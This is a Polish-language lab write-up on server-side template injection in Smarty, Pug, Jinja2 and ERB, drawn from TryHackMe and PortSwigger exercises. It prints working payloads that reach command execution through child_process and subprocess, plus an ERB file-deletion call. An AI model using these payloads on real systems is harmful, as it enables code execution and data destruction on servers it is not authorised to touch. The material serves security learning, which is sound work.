# Template Engines and Evaluation

## Wazna zasada

Nie zakladaj silnika na podstawie jednego generycznego payloadu. Rozne engine uzywaja roznej skladni i moga dawac rozne wyniki dla podobnych wyrazen.

Przyklady ponizej sa obserwacjami z autoryzowanych labow, nie uniwersalnymi payloadami dla kazdej wersji i konfiguracji.

## Smarty / PHP

Smarty jest template engine dla PHP. W labie TryHackMe prosta operacja modifiera zmienila tekst na wielkie litery, co pokazalo, ze input byl parsowany jako skladnia Smarty, a nie wyswietlany literalnie.

Sciezka nauki:

```text
kontrolowany input
  -> ewaluacja wyrazenia Smarty
  -> dostep do dozwolonej funkcji PHP w labie
  -> wykonanie komendy systemowej
```

Przyklad labowy:

```smarty
{'Hello'|upper}
```

Wynik uppercase potwierdzil ewaluacje Smarty. W celowo podatnym labie glebszy impact pokazala forma:

```smarty
{system("ls")}
```

Wazne rozroznienia:

- Poczatkowy dowod to ewaluacja szablonu.
- Pozniejsze wywolanie funkcji PHP pokazalo glebszy impact.
- Nie kazda konfiguracja Smarty pozwala na dowolne funkcje PHP.
- Security policy, dozwolone modifiers, plugins i wersja wplywaja na impact.

## Pug / Node.js

Pug kompiluje template source do JavaScriptu i przekazuje dane jako locals. Bezpieczny wzorzec to statyczny plik Pug plus obiekt danych.

```javascript
res.render('profile', { username: userInput });
```

Podatny wzorzec to dynamiczne kompilowanie Pug source zawierajacego tekst kontrolowany przez uzytkownika.

### Interpolation

- `#{...}` ocenia wyrazenie i escapuje HTML output.
- `!{...}` ocenia wyrazenie i wstawia output bez escapingu.

Escaping pomaga przy XSS w outputcie. Nie zatrzymuje ewaluacji wyrazenia, gdy uzytkownik kontroluje template source.

### Lekcja ze `spawnSync()`

API Node.js rozdziela executable, argumenty i opcje procesu:

```javascript
spawnSync(command, args, options)
```

Poprawna forma:

```javascript
spawnSync('ls', ['-lah'])
```

Niepoprawna forma:

```javascript
spawnSync('ls -lah')
```

Bez parsowania przez shell drugi przyklad probuje znalezc executable o nazwie bedacej calym stringiem.

Trzeci parametr to obiekt opcji, nie kolejna komenda:

```javascript
spawnSync('ls', ['-lah'], { cwd: '/tmp' })
```

`spawnSync().stdout` jest Bufferem, wiec tekstowy output moze wymagac:

```javascript
result.stdout.toString()
```

### Moja pomylka

Poczatkowo probowalem umiescic kolejna komende w trzecim parametrze i przekazywalem komende plus nazwe pliku jako jeden string. To byl blad uzycia API, nie porazka samego SSTI.

### Przyklad Pug tylko z labu

Ukonczone cwiczenie THM uzywalo lancucha zaleznego od srodowiska, podobnego do:

```pug
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout.toString()}
```

Ten przyklad jest zapisany po to, zeby wyjasnic process API i wynik labu, a nie jako uniwersalny payload.

### Sciezki obiektow zalezne od srodowiska

Sciezka labowa uzywajaca obiektow takich jak `process.mainModule` zalezy od wersji i srodowiska. Moze zmieniac sie przez:

- CommonJS vs ESM,
- wersje Node.js,
- dostepne template locals,
- sandboxing,
- sposob startu aplikacji.

Traktuj to jako technike labowa, nie uniwersalny payload Pug.

## Jinja2 / Python

Jinja uzywa jezyka szablonow podobnego do Pythona. Nie daje po prostu nieograniczonego wykonania Pythona w kazdym bloku `{{ ... }}`.

Podstawowe obliczenie potwierdza ewaluacje szablonu, nie pelny Python ani OS execution.

W labie TryHackMe dluzszy lancuch object traversal dotarl do obiektow runtime Pythona, a potem do modulu `subprocess`. Wazny model:

```text
Jinja expression
  -> Python object graph
  -> import functionality
  -> subprocess API
  -> external process
```

### Lekcja z `check_output()`

`subprocess.check_output()` w Pythonie domyslnie uzywa `shell=False`.

Komenda bez argumentow moze zadzialac jako jeden string:

```python
subprocess.check_output('ls')
```

Komenda z argumentami powinna byc rozdzielona:

```python
subprocess.check_output(['ls', '-lah'])
```

To zwykle sie nie uda:

```python
subprocess.check_output('ls -lah')
```

Bez shella Python nie dzieli stringa na executable i argumenty. Probuje znalezc executable pasujacy do calego stringa.

`check_output()` zwraca bytes, jesli nie podano opcji tekstu/encodingu, wiec output moze wygladac tak:

```text
b'file1\nfile2\n'
```

### Nuans bezpieczenstwa

Uzycie listy argumentow i pozostawienie `shell=False` ogranicza interpretacje shella. Nie czyni process execution bezpiecznym, jesli atakujacy kontroluje:

- executable,
- wrazliwe argumenty,
- sciezki plikow albo opcje o niebezpiecznym znaczeniu,
- sciezke kodu wywolujaca proces.

### Przyklad Jinja2 tylko z labu

Ukonczone cwiczenie THM uzywalo environment-specific object traversal podobnego do:

```jinja2
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
```

Hard-coded index byl specyficzny dla tego srodowiska labowego.

### Sciezki obiektow zalezne od srodowiska

Object traversal w Jinja przez `__mro__`, `__subclasses__()` i hard-coded class index zalezy od wersji Pythona, zaimportowanych modulow, frameworka i kolejnosci ladowania. Index dzialajacy w jednym labie moze byc zly gdzie indziej.

## ERB / Ruby

ERB osadza wyrazenia Ruby w szablonach. W ukonczonym labie PortSwigger wyrazenie arytmetyczne zwrocilo `49`, co potwierdzilo, ze parametr `message` byl oceniany przez ERB.

Lab uzyl potem bezposredniego API Ruby do plikow:

```ruby
File.delete('/home/carlos/morale.txt')
```

To bylo przydatne, bo nie wymagalo uruchamiania shella ani `rm`.

Sciezka:

```text
message parameter
  -> ERB template source
  -> Ruby expression
  -> File.delete()
  -> file deletion
```

Oryginalna podatnosc pozostala SSTI. Usuniecie pliku bylo pokazanym impactem.

## Porownanie silnikow

| Engine | Runtime | Podstawowy dowod labowy | Glebsza sciezka impactu |
|---|---|---|---|
| Smarty | PHP | Modifier albo expression zmienia output | Dozwolona funkcja PHP |
| Pug | Node.js / JavaScript | Wynik wyrazenia JavaScript | Node runtime i child process API |
| Jinja2 | Python | Wynik wyrazenia szablonu | Python object graph i subprocess |
| ERB | Ruby | Wynik wyrazenia Ruby | Ruby file albo process APIs |

## Glowna lekcja

Dzialajace wyrazenie to tylko pierwszy dowod.

```text
evaluation confirmed
  != automatycznie full RCE
```

Kolejne pytanie brzmi zawsze: jakie obiekty, funkcje i uprawnienia sa faktycznie dostepne w tym konkretnym srodowisku.
